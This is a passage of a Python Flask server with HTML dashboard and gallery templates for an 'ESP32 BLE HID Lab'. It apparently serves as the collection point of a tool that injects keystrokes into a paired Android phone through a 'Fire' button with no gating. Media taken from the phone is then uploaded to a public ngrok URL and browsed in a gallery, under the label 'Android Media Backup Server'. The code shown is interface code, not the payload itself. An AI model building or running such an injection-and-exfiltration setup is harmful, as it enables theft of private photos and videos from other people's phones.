    ls.textContent  = '';
  } else {
    dot.style.background = 'var(--muted)';
    txt.textContent = 'ESP32 — Not seen';
    sub.textContent = 'Flash firmware, set WiFi credentials, and power on';
    ls.textContent  = '';
  }

  // ── BLE / Android connection status ───────────────────────────────────
  const bleRow = document.getElementById('ble-status-row');
  const bleDot = document.getElementById('ble-dot');
  const bleTxt = document.getElementById('ble-status-text');
  if (online) {
    bleRow.style.display = 'flex';
    if (bleConn) {
      bleDot.style.background = 'var(--green)';
      bleTxt.textContent = '📱 Android — Paired & Connected';
      bleTxt.style.color = 'var(--green)';
    } else {
      bleDot.style.background = 'var(--amber)';
      bleTxt.textContent = '📱 Android — Not connected  (pair via Bluetooth settings)';
      bleTxt.style.color = 'var(--amber)';
    }
  } else {
    bleRow.style.display = 'none';
  }

  // ── USB / Serial host connection status ───────────────────────────────
  const usbRow = document.getElementById('usb-status-row');
  const usbDot = document.getElementById('usb-dot');
  const usbTxt = document.getElementById('usb-status-text');
  const usbSub = document.getElementById('usb-status-sub');
  if (online) {
    usbRow.style.display = 'flex';
    if (usbConn) {
      usbDot.style.background = '#60a5fa';   // blue — informational
      usbTxt.textContent = '💻 Host USB — Connected (Serial port open)';
      usbTxt.style.color = '#60a5fa';
      usbSub.textContent = 'Your computer has the ESP32 Serial port open (Arduino IDE / monitor)';
    } else {
      usbDot.style.background = 'var(--muted)';
      usbTxt.textContent = '💻 Host USB — Not connected';
      usbTxt.style.color = 'var(--muted)';
      usbSub.textContent = 'No host has the ESP32 Serial port open';
    }
  } else {
    usbRow.style.display = 'none';
  }

  // ── Wrong-target warning ──────────────────────────────────────────────
  // Show when: ESP32 is online AND USB is connected AND BLE is NOT connected.
  // In this state, firing would type keystrokes into the host computer.
  const wrongWarn = document.getElementById('wrong-target-warn');
  wrongWarn.style.display = (online && usbConn && !bleConn) ? '' : 'none';

  // ── Fire button — always clickable, no gating ──────────────────────────
  const btn = document.getElementById('trigger-btn');
  if (!btn.disabled) {
    btn.style.opacity = '1';
    btn.title = '';
  }

  // ── Pending warning ───────────────────────────────────────────────────
  document.getElementById('ctrl-pending-warn').style.display = d.pending_cmd ? '' : 'none';

  // ── Build ext grid once ───────────────────────────────────────────────
  if (d.active_exts) buildExtGrid(d.active_exts);
}

// ─────────────────────────────────────────────────────────────────────────────

// Inject ext-chip style into <head>
const style = document.createElement('style');
style.textContent = `.ext-chip{padding:3px 10px;border-radius:12px;font-size:.72rem;font-weight:500;cursor:pointer;border:1px solid var(--border);color:var(--muted);background:var(--surface2);transition:all .12s;user-select:none}.ext-chip.on{background:rgba(79,142,247,.12);border-color:rgba(79,142,247,.4);color:var(--accent)}`;
document.head.appendChild(style);

poll();
setInterval(poll, 3000);
</script>
</body>
</html>"""

# ── Gallery HTML template ─────────────────────────────────────────────────────

GALLERY_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Media Gallery</title>
<style>
:root{
  --bg:#0a0c14;--surface:#111420;--surface2:#171b2e;--border:#1f2440;
  --text:#e2e8f0;--muted:#4b5680;--accent:#4f8ef7;--green:#22d47a;
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,"Segoe UI",system-ui,sans-serif;
     background:var(--bg);color:var(--text);min-height:100vh}
a{color:var(--accent);text-decoration:none}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}

/* ── topbar ── */
.topbar{display:flex;align-items:center;gap:12px;padding:0 24px;height:52px;
        background:var(--surface);border-bottom:1px solid var(--border);
        position:sticky;top:0;z-index:100}
.topbar h1{font-size:.95rem;font-weight:700;color:#f1f5f9}
.topbar .sub{font-size:.72rem;color:var(--muted)}
.topbar-right{margin-left:auto;display:flex;gap:8px;align-items:center}
.pill{padding:4px 12px;border-radius:16px;border:1px solid var(--border);
      font-size:.72rem;color:var(--muted);background:var(--surface2)}
.pill.green{border-color:rgba(34,212,122,.3);color:var(--green);background:rgba(34,212,122,.08)}
.top-btn{padding:5px 12px;border-radius:6px;font-size:.75rem;border:1px solid var(--border);
         color:var(--muted);background:var(--surface2);cursor:pointer;transition:all .15s}
.top-btn:hover{color:#f1f5f9;border-color:#4b5680}

/* ── filter tabs ── */
.filters{display:flex;gap:6px;padding:14px 24px;flex-wrap:wrap;
         border-bottom:1px solid var(--border);background:var(--surface)}
.ftab{padding:5px 14px;border-radius:20px;font-size:.78rem;font-weight:500;
      border:1px solid var(--border);color:var(--muted);cursor:pointer;
      background:transparent;transition:all .15s;user-select:none}
.ftab:hover{color:var(--text);border-color:#4b5680}
.ftab.active{color:var(--accent);border-color:rgba(79,142,247,.5);
             background:rgba(79,142,247,.08)}
.ftab .fc{font-size:.68rem;margin-left:4px;opacity:.7}

/* ── search ── */
.search-wrap{padding:12px 24px;background:var(--bg)}
.search-input{width:100%;max-width:360px;background:var(--surface);border:1px solid var(--border);
              border-radius:8px;padding:7px 14px;color:var(--text);font-size:.82rem;outline:none}
.search-input:focus{border-color:var(--accent)}
.search-input::placeholder{color:var(--muted)}

/* ── grid ── */
.gallery{padding:0 20px 32px;
         columns:5 180px;column-gap:10px}
.gitem{break-inside:avoid;margin-bottom:10px;border-radius:8px;overflow:hidden;
       background:var(--surface);border:1px solid var(--border);
       cursor:pointer;transition:transform .15s,box-shadow .15s;position:relative}
.gitem:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.4)}
.gitem img{width:100%;display:block;object-fit:cover}
.gitem .vid-thumb{width:100%;aspect-ratio:16/9;background:#000;
                  display:flex;align-items:center;justify-content:center}
.gitem .play-icon{width:40px;height:40px;border-radius:50%;
                  background:rgba(255,255,255,.18);display:flex;
                  align-items:center;justify-content:center}
.gitem .play-icon svg{margin-left:3px}
.gitem .doc-thumb{width:100%;height:100px;display:flex;align-items:center;
                  justify-content:center;font-size:2rem;background:var(--surface2)}
.gitem .item-meta{padding:6px 10px 8px;font-size:.7rem;color:var(--muted);
                  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.gitem .item-cat{position:absolute;top:6px;left:6px;padding:2px 7px;
                 border-radius:10px;font-size:.62rem;font-weight:600;
                 background:rgba(0,0,0,.55);color:#fff;backdrop-filter:blur(4px)}
.gitem .item-dl{position:absolute;top:6px;right:6px;width:26px;height:26px;
                border-radius:6px;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);
                display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .15s}
.gitem:hover .item-dl{opacity:1}

/* ── section heading ── */
.sec-head{padding:16px 24px 8px;font-size:.72rem;font-weight:600;color:var(--muted);
          text-transform:uppercase;letter-spacing:.07em}

/* ── empty ── */
.empty-state{display:flex;flex-direction:column;align-items:center;
             justify-content:center;padding:80px 24px;gap:12px;color:var(--muted)}
.empty-state svg{opacity:.2}
.empty-state p{font-size:.9rem}

/* ── lightbox ── */
.lb{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:1000;
    display:none;flex-direction:column;align-items:center;justify-content:center}
.lb.open{display:flex}
.lb-topbar{position:absolute;top:0;left:0;right:0;height:52px;
           display:flex;align-items:center;padding:0 16px;gap:12px;
           background:linear-gradient(to bottom,rgba(0,0,0,.7),transparent)}
.lb-name{font-size:.8rem;color:#e2e8f0;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.lb-cat{font-size:.7rem;color:var(--muted);padding:2px 8px;border-radius:10px;
        border:1px solid var(--border);background:rgba(255,255,255,.06)}
.lb-counter{font-size:.75rem;color:var(--muted)}
.lb-close{width:32px;height:32px;border-radius:6px;border:none;cursor:pointer;
          background:rgba(255,255,255,.1);color:#e2e8f0;font-size:1.1rem;
          display:flex;align-items:center;justify-content:center;transition:background .15s}
.lb-close:hover{background:rgba(255,255,255,.2)}
.lb-dl{padding:5px 14px;border-radius:6px;border:1px solid var(--border);
       color:#e2e8f0;font-size:.75rem;background:rgba(255,255,255,.08);
       text-decoration:none;transition:background .15s}
.lb-dl:hover{background:rgba(255,255,255,.16)}
.lb-body{max-width:92vw;max-height:82vh;position:relative;display:flex;align-items:center;justify-content:center}
.lb-body img{max-width:92vw;max-height:82vh;border-radius:4px;object-fit:contain;user-select:none}
.lb-body video{max-width:92vw;max-height:82vh;border-radius:4px;outline:none}
.lb-nav{position:absolute;top:50%;transform:translateY(-50%);
        width:40px;height:40px;border-radius:50%;border:none;cursor:pointer;
        background:rgba(255,255,255,.12);color:#fff;font-size:1.1rem;
        display:flex;align-items:center;justify-content:center;
        transition:background .15s;user-select:none}
.lb-nav:hover{background:rgba(255,255,255,.25)}
.lb-prev{left:-56px}
.lb-next{right:-56px}
.lb-nav:disabled{opacity:.2;cursor:default}
.lb-info{position:absolute;bottom:0;left:0;right:0;height:48px;
         display:flex;align-items:center;padding:0 16px;gap:12px;
         background:linear-gradient(to top,rgba(0,0,0,.7),transparent)}
.lb-info .lb-size{font-size:.72rem;color:var(--muted)}
.lb-strip{position:absolute;bottom:-68px;left:50%;transform:translateX(-50%);
          display:flex;gap:5px;max-width:90vw;overflow-x:auto;padding:4px 0}
.lb-strip::-webkit-scrollbar{height:3px}
.strip-thumb{width:52px;height:52px;border-radius:4px;object-fit:cover;cursor:pointer;
             flex-shrink:0;opacity:.5;border:2px solid transparent;transition:all .15s}
.strip-thumb.active{opacity:1;border-color:var(--accent)}
</style>
</head>
<body>

<!-- ── TOPBAR ── -->
<div class="topbar">
  <div>
    <h1>Media Gallery</h1>
  </div>
  <span class="sub" style="margin-left:8px">ESP32 BLE HID Lab</span>
  <div class="topbar-right">
    <span class="pill green" id="tb-count">{{ total }} files</span>
    <span class="pill" id="tb-mb">{{ total_mb }} MB</span>
    <a href="/dashboard" class="top-btn">Dashboard</a>
    <a href="/report" class="top-btn">Report</a>
  </div>
</div>

<!-- ── FILTER TABS ── -->
<div class="filters" id="filters">
  <div class="ftab active" data-cat="all" onclick="filter('all',this)">
    All <span class="fc" id="fc-all">{{ total }}</span>
  </div>
  {% for cat, files in groups.items() %}
  <div class="ftab" data-cat="{{ cat }}" onclick="filter('{{ cat }}',this)">
    {{ cat }} <span class="fc">{{ files|length }}</span>
  </div>
  {% endfor %}
</div>

<!-- ── SEARCH ── -->
<div class="search-wrap">
  <input class="search-input" type="text" id="search" placeholder="Search filenames..." oninput="applySearch()">
</div>

<!-- ── GALLERY ── -->
<div class="gallery" id="gallery">
{% if groups %}
  {% for cat, files in groups.items() %}
    {% for fname in files %}
    {% set ext = fname.rsplit('.',1)[-1].lower() %}
    {% set is_img = ext in ['jpg','jpeg','png','webp','gif','bmp','tiff','tif','heic'] %}
    {% set is_vid = ext in ['mp4','mov','avi','mkv','3gp','m4v','webm','ts'] %}
    <div class="gitem"
         data-cat="{{ cat }}"
         data-name="{{ fname }}"
         data-url="/download/{{ cat }}/{{ fname }}"
         data-type="{{ 'img' if is_img else ('vid' if is_vid else 'doc') }}"
         onclick="openLightbox(this)">
      <span class="item-cat">{{ cat }}</span>
      <a class="item-dl" href="/download/{{ cat }}/{{ fname }}" download onclick="event.stopPropagation()" title="Download">
        <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M6.5 1v8M3 6l3.5 3.5L10 6M1 12h11" stroke="#fff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </a>
      {% if is_img %}
      <img src="/download/{{ cat }}/{{ fname }}" alt="{{ fname }}" loading="lazy">
      {% elif is_vid %}
      <div class="vid-thumb">
        <div class="play-icon">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="white"><path d="M4 2l10 6-10 6V2z"/></svg>
        </div>
      </div>
      {% else %}
      <div class="doc-thumb">📄</div>
      {% endif %}
      <div class="item-meta" title="{{ fname }}">{{ fname }}</div>
    </div>
    {% endfor %}
  {% endfor %}
{% else %}
  <div class="empty-state">
    <svg width="56" height="56" viewBox="0 0 56 56" fill="none">
      <rect x="8" y="12" width="40" height="32" rx="4" stroke="#4b5680" stroke-width="1.5"/>
      <circle cx="20" cy="22" r="3" stroke="#4b5680" stroke-width="1.5"/>
      <path d="M8 36l10-8 8 6 8-10 14 12" stroke="#4b5680" stroke-width="1.5" stroke-linejoin="round"/>
    </svg>
    <p>No media received yet.</p>
    <p style="font-size:.8rem">Connect the ESP32 and press the button.</p>
  </div>
{% endif %}
</div>

<!-- ── LIGHTBOX ── -->
<div class="lb" id="lb" onclick="lbBgClick(event)">
  <div class="lb-topbar">
    <span class="lb-cat" id="lb-cat"></span>
    <span class="lb-name" id="lb-name"></span>
    <span class="lb-counter" id="lb-counter"></span>
    <a class="lb-dl" id="lb-dl" href="#" download>⬇ Download</a>
    <button class="lb-close" onclick="closeLightbox()">✕</button>
  </div>
  <div class="lb-body" id="lb-body">
    <button class="lb-nav lb-prev" id="lb-prev" onclick="lbMove(-1)">‹</button>
    <div id="lb-media"></div>
    <button class="lb-nav lb-next" id="lb-next" onclick="lbMove(1)">›</button>
  </div>
</div>

<script>
// ── data ──────────────────────────────────────────────────────────────────────
const ALL_ITEMS = Array.from(document.querySelectorAll('.gitem'));
let _visible = [...ALL_ITEMS];
let _lbIdx   = 0;
let _lbItems = [];

// ── filter ────────────────────────────────────────────────────────────────────
function filter(cat, el) {
  document.querySelectorAll('.ftab').forEach(t => t.classList.remove('active'));
  el.classList.add('active');
  applyFilter(cat);
}

function applyFilter(cat) {
  const q = document.getElementById('search').value.toLowerCase();
  ALL_ITEMS.forEach(item => {
    const catMatch = cat === 'all' || item.dataset.cat === cat;
    const nameMatch = !q || item.dataset.name.toLowerCase().includes(q);
    item.style.display = (catMatch && nameMatch) ? '' : 'none';
  });
  _visible = ALL_ITEMS.filter(i => i.style.display !== 'none');
}

function applySearch() {
  const active = document.querySelector('.ftab.active');
  const cat = active ? active.dataset.cat : 'all';
  applyFilter(cat);
}

// ── lightbox ──────────────────────────────────────────────────────────────────
function openLightbox(el) {
  _lbItems = ALL_ITEMS.filter(i => i.style.display !== 'none');
  _lbIdx = _lbItems.indexOf(el);
  renderLb();
  document.getElementById('lb').classList.add('open');
  document.body.style.overflow = 'hidden';
}

function closeLightbox() {
  document.getElementById('lb').classList.remove('open');
  document.body.style.overflow = '';
  // stop any playing video
  const vid = document.querySelector('#lb-media video');
  if (vid) { vid.pause(); vid.src = ''; }
}

function lbBgClick(e) {
  if (e.target === document.getElementById('lb')) closeLightbox();
}

function lbMove(dir) {
  _lbIdx = Math.max(0, Math.min(_lbItems.length - 1, _lbIdx + dir));
  renderLb();
}

function renderLb() {
  const item = _lbItems[_lbIdx];
  if (!item) return;
  const url  = item.dataset.url;
  const name = item.dataset.name;
  const cat  = item.dataset.cat;
  const type = item.dataset.type;

  document.getElementById('lb-name').textContent    = name;
  document.getElementById('lb-cat').textContent     = cat;
  document.getElementById('lb-counter').textContent = (_lbIdx + 1) + ' / ' + _lbItems.length;
  const dlEl = document.getElementById('lb-dl');
  dlEl.href = url; dlEl.download = name;

  const media = document.getElementById('lb-media');
  // stop any previous video
  const prevVid = media.querySelector('video');
  if (prevVid) { prevVid.pause(); prevVid.src = ''; }

  if (type === 'img') {
    media.innerHTML = '<img src="' + url + '" alt="' + name + '" draggable="false">';
  } else if (type === 'vid') {
    media.innerHTML = '<video controls autoplay src="' + url + '" style="max-width:92vw;max-height:82vh;border-radius:4px;outline:none"></video>';
  } else {
    media.innerHTML = '<div style="color:#e2e8f0;font-size:.9rem;padding:40px;text-align:center">📄 ' + name + '<br><br><a href="' + url + '" download style="color:var(--accent)">Download file</a></div>';
  }

  document.getElementById('lb-prev').disabled = _lbIdx === 0;
  document.getElementById('lb-next').disabled = _lbIdx === _lbItems.length - 1;
}

// ── keyboard navigation ───────────────────────────────────────────────────────
document.addEventListener('keydown', e => {
  const lb = document.getElementById('lb');
  if (!lb.classList.contains('open')) return;
  if (e.key === 'ArrowLeft')  lbMove(-1);
  if (e.key === 'ArrowRight') lbMove(1);
  if (e.key === 'Escape')     closeLightbox();
});

// ── touch / swipe ─────────────────────────────────────────────────────────────
let _tx = null;
document.getElementById('lb').addEventListener('touchstart', e => { _tx = e.touches[0].clientX; }, {passive:true});
document.getElementById('lb').addEventListener('touchend',   e => {
  if (_tx === null) return;
  const dx = e.changedTouches[0].clientX - _tx;
  _tx = null;
  if (Math.abs(dx) > 50) lbMove(dx < 0 ? 1 : -1);
});

// ── auto-refresh ──────────────────────────────────────────────────────────────
setTimeout(() => {
  if (!document.getElementById('lb').classList.contains('open'))
    location.reload();
}, 20000);
</script>
</body>
</html>"""

# ── ngrok URL detection ───────────────────────────────────────────────────────

def get_ngrok_url() -> str:
    try:
        with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=2) as r:
            data = json.loads(r.read())
        for t in data.get("tunnels", []):
            pub = t.get("public_url", "")
            if pub.startswith("https://"):
                return pub
    except Exception:
        pass
    return ""

# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    public_url = get_ngrok_url()
    _is_windows = sys.platform.startswith("win")

    if not UPLOAD_TOKEN:
        log.warning("UPLOAD_TOKEN is not set — uploads will not be authenticated.")
        if _is_windows:
            log.warning("Set it (cmd):        set UPLOAD_TOKEN=your_secret")
            log.warning("Set it (PowerShell): $env:UPLOAD_TOKEN='your_secret'")
        else:
            log.warning("Set it:  export UPLOAD_TOKEN='your_secret'  then restart.")
        log.warning("Or create a .env file — see .env.example")

    if public_url:
        url_file = _BASE_DIR / "ngrok_url.txt"
        url_file.write_text(public_url + "\n")
        # Print URL to terminal but never print the token
        print(f"\n  ╔══════════════════════════════════════════════════════════╗")
        print(f"  ║     Android Media Backup Server  —  ngrok active         ║")
        print(f"  ╠══════════════════════════════════════════════════════════╣")
        print(f"  ║  Platform    :  {sys.platform}")
        print(f"  ║  Public URL  :  {public_url}")
        print(f"  ║  Health      :  {public_url}/health")
        print(f"  ║  Upload      :  {public_url}/upload        (POST)")
        print(f"  ║  Gallery     :  {public_url}/files")
        print(f"  ║  Report      :  {public_url}/report")
        print(f"  ║  Auth token  :  {'SET' if UPLOAD_TOKEN else 'NOT SET  ← WARNING'}")
        print(f"  ╠══════════════════════════════════════════════════════════╣")
        print(f"  ║  Paste the Public URL into WAN_SERVER_URL in .ino        ║")
        print(f"  ║  URL saved → {url_file}")
        print(f"  ╚══════════════════════════════════════════════════════════╝\n")
    else:
        print("\n  ╔══════════════════════════════════════════════════════════╗")
        print("  ║  [!] ngrok NOT detected on 127.0.0.1:4040                ║")
        print("  ║      Start ngrok FIRST:  ngrok http 8019                 ║")
        print("  ║      Then restart this server.                           ║")
        print("  ╚══════════════════════════════════════════════════════════╝\n")
        print(f"  Starting on port {PORT} (LAN-only without ngrok).\n")

    app.run(host="0.0.0.0", port=PORT, debug=False)
